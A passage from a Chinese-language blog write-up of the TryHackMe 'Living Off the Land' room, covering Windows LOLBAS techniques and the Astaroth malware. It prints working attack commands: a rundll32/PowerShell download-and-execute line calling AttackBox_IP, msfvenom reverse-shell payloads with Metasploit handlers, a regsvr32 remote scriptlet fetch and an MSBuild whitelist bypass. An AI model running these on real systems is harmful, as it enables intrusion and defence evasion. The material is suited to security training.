<li><strong><code>new ActiveXObject("WScript.Shell")</code></strong>：
<ul>
<li>创建一个 <code>WScript.Shell</code> 的 ActiveX 对象，这个对象可以用来执行系统命令、操作文件、注册表等。</li>
</ul>
</li>
<li><strong><code>w.run("calc")</code></strong>：
<ul>
<li>使用 <code>WScript.Shell</code> 对象的 <code>run()</code> 方法来运行系统命令。在这里，它运行了 <code>calc</code>，即 Windows 计算器程序。</li>
</ul>
</li>
<li><strong><code>window.close()</code></strong>：
<ul>
<li>关闭当前的窗口，这里是关闭执行环境。</li>
</ul>
</li>
</ul>
<p>在前面的命令中，我们使用了rundll32.exe 嵌入 JavaScript 组件eval()的二进制文件，用于执行calc.exe 二进制，微软计算器。</p>
<p>正如我们之前提到的，我们还可以使用 rundll32.exe 执行 PowerShell 脚本。以下命令运行 JavaScript，该 JavaScript 执行 PowerShell 脚本以使用 rundll32.exe 从远程网站下载.</p>
<pre><code class="hljs scss">C:\Users\thm&gt; rundll32.exe javascript:<span class="hljs-string">"\..\mshtml,RunHTMLApplication "</span>;document<span class="hljs-selector-class">.write</span>();new%<span class="hljs-number">20</span><span class="hljs-built_in">ActiveXObject</span>("WScript.Shell")<span class="hljs-selector-class">.Run</span>("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient)<span class="hljs-selector-class">.DownloadString</span>('http://AttackBox_IP/script.ps1');");</code></pre>
<p>作为先前执行的结果， script.ps1的副本下载到目标机器的内存中。</p>
<h1 id="0x06-应用程序白名单绕过">0x06 应用程序白名单绕过</h1>
<h2 id="绕过应用程序白名单">绕过应用程序白名单</h2>
<p>应用程序白名单是 Microsoft 端点安全功能，可防止恶意和未经授权的程序实时执行。应用程序白名单是基于规则的，它指定允许在操作系统上存在和执行的已批准应用程序或可执行文件的列表。此任务重点关注用于绕过 Windows 应用程序白名单的 LOLBAS 示例。</p>
<h2 id="regsvr32">Regsvr32</h2>
<p>Regsvr32 是一个 Microsoft 命令行工具，用于在 Windows 注册表中注册和取消注册动态链接库 (DLL)。 regsvr.exe 二进制文件位于：</p>
<ul>
<li>Windows 32 位版本的 C:\Windows\System32\regsvr32.exe</li>
<li>Windows 64 位版本的 C:\Windows\SysWOW64\regsvr32.exe</li>
</ul>
<p>除了预期用途之外，regsvr32.exe 二进制文件还可用于执行任意二进制文件并绕过 Windows 应用程序白名单。根据 <a target="_blank" rel="noopener" href="https://redcanary.com/">Red Canary 报告</a>，regsvr32.exe 二进制文件是第三大最流行的 <a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1218/010/">ATT&amp;CK 技术</a>。攻击者利用 regsvr32.exe 在本地或远程执行本机代码或脚本。regsvr32.exe 中使用的技术使用受信任的 Windows 操作系统组件并在内存中执行，这也是该技术也用于绕过应用程序白名单的原因之一。</p>
<p>让我们尝试在现实生活中应用这种技术。首先，我们需要创建一个恶意DLL 使用 msvenom 文件并设置 Metasploit 监听器来接收反向 shell。请注意，我们将创建一个适用于 32 位操作系统的恶意文件。我们将使用regsvr32.exe 应用程序白名单绕过技术在目标系统上运行命令。</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@machine</span>$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=<span class="hljs-number">443</span> -f dll -a x86 &gt; live0fftheland.dll 
[-] No platform was selected, choosing <span class="hljs-attribute">Msf</span>::<span class="hljs-attribute">Module</span>::<span class="hljs-attribute">Platform</span>::Windows from the payload 
No encoder specified, outputting raw payload 
Payload <span class="hljs-attribute">size</span>: <span class="hljs-number">375</span> bytes 
Final size of dll <span class="hljs-attribute">file</span>: <span class="hljs-number">8704</span> bytes 

user<span class="hljs-keyword">@machine</span>$ user<span class="hljs-keyword">@machine</span>$ msfconsole -q 
msf6 &gt; use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp 
msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp 
payload =&gt; windows/meterpreter/reverse_tcp 
msf6 exploit(multi/handler) &gt; set LHOST ATTACKBOX_IP
LHOST =&gt; ATTACKBOX_IP
msf6 exploit(multi/handler) &gt; set LPORT <span class="hljs-number">443</span> 
LPORT =&gt; <span class="hljs-number">443</span> 
msf6 exploit(multi/handler) &gt; exploit 

[*] Started reverse TCP handler on ATTACKBOX_<span class="hljs-attribute">IP</span>:<span class="hljs-number">443</span></code></pre>
<p>请注意，我们将输出类型指定为DLL 使用-f 参数。一旦生成了恶意DLL文件，我们就需要将有效负载传递给受害者计算机。我们将通过使用网络服务器在我们的攻击机器上提供DLL文件来做到这一点，如下所示，</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@machine</span>$ python3 -m http.server <span class="hljs-number">1337</span></code></pre>
<p>从受害者机器上，通过端口1337访问攻击机器的 Web 服务器 我们指定的。请注意，此端口可以根据您的选择进行更改！</p>
<p>在受害计算机上，下载文件 DLL 文件后，我们使用regsvr32.exe执行它 如下，</p>
<pre><code class="hljs scss">C:\Users\thm&gt; c:\Windows\System32\regsvr32.exe c:\Users\thm\Downloads\live0fftheland.dll
or
C:\Users\thm&gt; c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\live0fftheland.dll</code></pre>
<p>使用第二个选项（这是一个更高级的命令），我们指示regsvr32.exe 运行：</p>
<ul>
<li>/s：处于静默模式（不显示消息）</li>
<li>/n：不调用DLL注册服务器</li>
<li>/i：使用另一台服务器，因为我们使用了 /n</li>
<li>/u：使用注销方法运行</li>
</ul>
<p>在攻击机器上，我们应该收到一个反向 shell。</p>
<pre><code class="hljs scss">msf6 &gt; <span class="hljs-built_in">exploit</span>(multi/handler) &gt; exploit 

<span class="hljs-selector-attr">[*]</span> Started reverse TCP handler on ATTACKBOX_IP:<span class="hljs-number">443</span> 
[*] Sending stage (<span class="hljs-number">175174</span> bytes) to <span class="hljs-number">10.10</span>.<span class="hljs-number">159.197</span> 
[*] Meterpreter session <span class="hljs-number">1</span> opened (ATTACKBOX_IP:<span class="hljs-number">443</span> -&gt; <span class="hljs-number">10.10</span>.<span class="hljs-number">159.197</span>:<span class="hljs-number">52845</span> ) at <span class="hljs-number">2022</span>-<span class="hljs-number">01</span>-<span class="hljs-number">20</span> <span class="hljs-number">05</span>:<span class="hljs-number">51</span>:<span class="hljs-number">31</span> -<span class="hljs-number">0600</span></code></pre>
<p>注意如果我们想创建64位DLL版本，我们需要在msfvenom命令中指定它并使用 64 位版本的regsvr32.exe从受害计算机运行它位于 C:\Windows\SysWOW64\regsvr32.exe。</p>
<h2 id="bourne-again-shell-bash">Bourne Again Shell (Bash)</h2>
<p>2016 年，微软在 Windows 10,11 和 Server 2019 上添加了对 Linux 环境的支持。此功能称为 Windows Subsystem for Linux ( <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/wsl/about">WSL</a> )，存在<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/wsl/compare-versions">两个 WSL 版本</a>：WSL1 和 WSL2。 WSL 是一个在操作系统上运行的 Hyper-V 虚拟化 Linux 发行版，支持 Linux 内核和系统调用的子集。此功能是一个插件，用户可以安装该插件并与 Linux 发行版交互。作为 WSL 的一部分， bash.exe 是一个用于与Linux环境交互的 Microsoft 工具。</p>
<p>人们找到了执行有效负载并绕过 Windows 应用程序白名单的方法，因为它是 Microsoft 签名的二进制文件。通过执行bash.exe -c “p​​ath-to-payload” ，我们可以执行任何未签名的有效负载。 ATT&amp;CK 将此称为<strong>间接命令执行</strong>技术 攻击者滥用 Windows 工具实用程序来获取命令执行。有关此技术的更多信息，您可以访问<a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1202/">T1202</a> ATT&amp;CK 网站。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408202246137.png" alt="image-20240820190251946"></p>
<p>请注意，您需要在 Windows 10 中启用并安装 Windows Subsystem for Linux才能使用bash.exe。此外，由于嵌套虚拟化限制，附加的 VM 未启用Linux子系统。</p>
<p>请记住，本节重点介绍了一些有趣的工具。如果您有兴趣查看可用的 LOLBAS 工具，您可以访问该<a target="_blank" rel="noopener" href="https://lolbas-project.github.io/">项目网站</a>。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408202246138.png" alt="image-20240820190352108"></p>
<h1 id="0x07-其他技术">0x07 其他技术</h1>
<p>本节重点介绍一些使用的有趣技术，无论是初始访问还是持久性。以下技术属于 Living Off the Land 范畴，因为它们可以用作 Windows 环境实用程序的一部分。</p>
<h2 id="shortcuts-快捷方式">Shortcuts 快捷方式</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408202246139.png" alt="image-20240820190439129"></p>
<p>快捷方式或符号链接是一种用于引用操作系统内其他文件或应用程序的技术。一旦用户单击快捷方式文件，就会执行参考文件或应用程序。通常，红队利用此技术来获得初始访问权限、权限升级或持久性。 MITRE ATT&amp;CK 框架将此<strong>快捷方式修改技术</strong>称为<a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1547/009/">T1547</a> ，攻击者创建或修改快捷方式以利用此技术。</p>
<p>要使用快捷方式修改技术，我们可以使用以下命令设置目标部分来执行文件：</p>
<ul>
<li>Rundll32</li>
<li>Powershell</li>
<li>Regsvr32</li>
<li>Executable on disk</li>
</ul>
<p>附图显示了快捷方式修改技术的示例，其中攻击者修改了 Excel 目标部分以使用rundll32.exe执行二进制文件。我们选择执行计算器而不是运行 Excel 应用程序。一旦受害者点击 Excel 快捷方式图标， calc.exe 被执行。有关快捷方式修改的更多信息，您可以查看<a target="_blank" rel="noopener" href="https://github.com/theonlykernel/atomic-red-team/blob/master/atomics/T1023/T1023.md">此</a>GitHub 存储库。</p>
<h2 id="no-powershell">No PowerShell!</h2>
<p>2019 年，Red Canary 发布了一份威胁检测报告，指出 PowerShell 是恶意活动最常用的技术。因此，组织开始监控或阻止powershell.exe 以免被处决。因此，攻击者会找到其他方法来运行 PowerShell 代码而不生成它。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408202246140.png" alt="image-20240820190631869"></p>
<p>PowerLessShell 是一个基于 Python 的工具，可生成恶意代码在目标计算机上运行，而不显示PowerShell进程的实例。 PowerLessShell 依赖滥用 Microsoft Build Engine (MSBuild)（一个用于构建 Windows 应用程序的平台）来执行远程代码。</p>
<p>首先，让我们将项目的副本从 GitHub 存储库下载到 AttackBox 上：</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@machine</span>$ git clone <span class="hljs-attribute">https</span>://github.com/Mr-Un1k0d3r/PowerLessShell.git</code></pre>
<p>项目要求之一是获取 PowerShell 有效负载以使其适合与 MSBuild 一起使用。在 AttackBox 上，我们需要使用msfvenom生成PowerShell有效负载 如下：</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@machine</span>$ msfvenom -p windows/meterpreter/reverse_winhttps LHOST=AttackBox_IP LPORT=<span class="hljs-number">4443</span> -f psh-reflection &gt; liv0ff.ps1</code></pre>
<p>另外，我们需要运行Metasploit框架来监听并等待反向shell。</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@machine</span>$ msfconsole -q -x <span class="hljs-string">"use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost AttackBox_IP;set lport 4443;exploit"</span>
[*] Using configured payload generic/shell_reverse_tcp
payload =&gt; windows/meterpreter/reverse_winhttps
lhost =&gt; AttackBox_IP lport =&gt; <span class="hljs-number">4443</span>
[*] Started HTTPS reverse handler on <span class="hljs-attribute">https</span>://AttackBox_<span class="hljs-attribute">IP</span>:<span class="hljs-number">4443</span></code></pre>
<p>现在我们已经准备好有效负载，更改为 PowerLessShell 目录项目以将有效负载转换为与 MSBuild 工具兼容。然后运行 ​​PowerLessShell 工具并将源文件设置为我们使用 msfvenom 创建的文件，如下所示：</p>
<pre><code class="hljs scss">user<span class="hljs-keyword">@machine</span>$ python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj</code></pre>
<p>命令执行成功后，我们需要将输出文件传输到 Windows 机器。您可以使用SCP来完成此操作或设置 Web 服务器以在 AttackBox 上托管文件 ( python3 -m http.server 1337 ) 并使用浏览器下载文件。</p>
<pre><code class="hljs scss">scp live<span class="hljs-selector-class">.csproj</span> <span class="hljs-number">10.10</span><span class="hljs-selector-class">.254</span><span class="hljs-selector-class">.209</span>:C:\Users\thm\Desktop</code></pre>
<p>最后，在目标 Windows 计算机上构建.csproj 文件并等待反向shell！</p>
<pre><code class="hljs scss">C:\Users\thm&gt; c:\Windows\Microsoft.NET\Framework\v4.<span class="hljs-number">0.30319</span>\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj</code></pre>
<p>运行 MSBuild 命令后，等待几秒钟，直到收到反向 shell。请注意，不会有powershell.exe进程正在运行。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408202246141.png" alt="image-20240820192818731"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408202246142.png" alt="image-20240820192257537"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408202246143.png" alt="image-20240820192321522"></p>
<h1 id="0x08-真实场景">0x08 真实场景</h1>
<p>此任务介绍了使用本会议室讨论的技术的恶意软件展示。</p>
<p>2017 年，Windows Defender 高级威胁防护 ( <a target="_blank" rel="noopener" href="https://www.microsoft.com/security/blog/2018/11/15/whats-new-in-windows-defender-atp/">Windows Defender ATP</a> ) 研究团队发现了名为<strong>Astaroth</strong>的无文件恶意软件。无文件恶意软件意味着恶意软件在系统中运行并执行，而不写入磁盘。恶意软件从受害设备的内存中执行其所有功能。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408202246144.png" alt="image-20240820192448492"></p>
<p><strong>Astaroth</strong>被称为<strong>信息窃取程序</strong>，它从受害者用户那里获取敏感信息，例如帐户凭据、击键和其他数据，并将其发送给攻击者。该恶意软件依赖于各种先进技术，例如反调试、反虚拟化、反仿真技巧、进程空洞、NTFS 备用数据流 (ADS) 和“Living off the land binaries”来执行不同的功能。</p>
<p>在初始访问阶段，攻击者依赖包含恶意附件文件的垃圾邮件活动。附件是一个LNK文件快捷方式，一旦受害者单击它，将导致以下结果：</p>
<ul>
<li>执行<strong>WMIC</strong>命令来下载并运行 Javascript 代码。</li>
<li>滥用<strong>BITSadmin</strong>从C2下载多个二进制文件。有趣的是，在某些情况下，恶意软件会使用 YouTube 频道描述来隐藏其C2服务器命令。</li>
<li>使用<strong>BITSadmin</strong> （ADS 技术）将其二进制文件隐藏在系统中以实现持久性。</li>
<li><strong>Certutil</strong>工具用于将几个下载的有效负载解码为DLL文件。</li>
<li>DLL文件使用<strong>Regsvr32</strong>执行。</li>
</ul>
<p>有关恶意软件和检测的更多详细信息，我们建议检查以下参考文献：</p>
<ol>
<li><a target="_blank" rel="noopener" href="https://www.armor.com/resources/threat-intelligence/astaroth-banking-trojan/">Astaroth: Banking Trojan Astaroth：银行木马</a></li>
<li><a target="_blank" rel="noopener" href="https://www.trendmicro.com/vinfo/de/security/news/cybercrime-and-digital-threats/microsoft-discovers-fileless-malware-campaign-dropping-astaroth-info-stealer">微软发现无文件恶意软件活动投放 Astaroth 信息窃取程序</a></li>
<li><a target="_blank" rel="noopener" href="https://www.zdnet.com/article/astaroth-malware-hides-command-servers-in-youtube-channel-descriptions/">Astaroth 恶意软件在 YouTube 频道描述中隐藏命令服务器</a></li>
</ol>
<h1 id="0x09-结论">0x09 结论</h1>
<p>在这个房间里，我们介绍了**“靠土地生活”**的一般概念，并回顾了红队活动期间看到和使用的一些例子。 Living Off the Land 技术可用于各种目的，包括侦察、文件操作、执行二进制文件以及持久性和绕过安全措施。</p>
<h2 id="其他资源">其他资源</h2>
<ul>
<li><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFOBins</a> - LOLBAS 项目的Linux版本。</li>
<li><a target="_blank" rel="noopener" href="https://www.armor.com/resources/threat-intelligence/astaroth-banking-trojan/">Astaroth：银行木马</a>- 现实生活中的恶意软件分析，他们展示了恶意软件使用的 Living Off the Land 技术。</li>
</ul>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2024/08/20/thm-kao-tu-di-wei-sheng/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2024/08/20/thm-kao-tu-di-wei-sheng/')">THM-靠土地为生</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2024/08/20/thm-kao-tu-di-wei-sheng/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=THM-靠土地为生&amp;url=http://hybcx.xyz/2024/08/20/thm-kao-tu-di-wei-sheng/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/TryHackMe/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>TryHackMe<span class="tagsPageCount">42</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/08/20/thm-tao-bi-ri-zhi-ji-lu-he-jian-kong/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">THM-逃避日志记录和监控</div></div></a></div><div class="next-post pull-right"><a href="/2024/08/21/thm-wang-luo-an-quan-jie-jue-fang-an/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">THM-网络安全解决方案</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2024/02/14/thm-basic-pentesting/" title="THM-Basic Pentesting"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-02-14</div><div class="title">THM-Basic Pentesting</div></div></a></div><div><a href="/2024/08/08/thm-bypass-uac/" title="THM-ByPass_UAC"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-08-08</div><div class="title">THM-ByPass_UAC</div></div></a></div><div><a href="/2024/06/17/thm-corp/" title="THM-Corp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-17</div><div class="title">THM-Corp</div></div></a></div><div><a href="/2024/07/10/thm-c2-jian-jie/" title="THM-C2简介"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-07-10</div><div class="title">THM-C2简介</div></div></a></div><div><a href="/2024/06/09/thm-enumerating-active-directory/" title="THM-Enumerating Active Directory"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-09</div><div class="title">THM-Enumerating Active Directory</div></div></a></div><div><a href="/2024/06/16/thm-hacking-with-powershell/" title="THM-Hacking_With_PowerShell"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-16</div><div class="title">THM-Hacking_With_PowerShell</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">hybcx</h1><div class="author-info__desc">只需热爱, 未来可期！</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hybchenxing" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1761635300" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">0x01 介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E9%9D%A0%E5%9C%9F%E5%9C%B0%E4%B8%BA%E7%94%9F"><span class="toc-number">1.1.</span> <span class="toc-text">什么是“靠土地为生”？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0%E7%9B%AE%E6%A0%87"><span class="toc-number">1.2.</span> <span class="toc-text">学习目标</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%BF%E9%97%B4%E5%85%88%E5%86%B3%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.3.</span> <span class="toc-text">房间先决条件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-windows-%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8"><span class="toc-number">2.</span> <span class="toc-text">0x02 Windows 系统内核</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-windows-sysinternals"><span class="toc-number">2.1.</span> <span class="toc-text">什么是 Windows Sysinternals</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sysinternals-live"><span class="toc-number">2.2.</span> <span class="toc-text">Sysinternals Live</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BA%A2%E9%98%9F%E7%9A%84%E5%88%A9%E7%94%A8%E5%92%8C%E5%A5%BD%E5%A4%84"><span class="toc-number">2.3.</span> <span class="toc-text">红队的利用和好处</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" 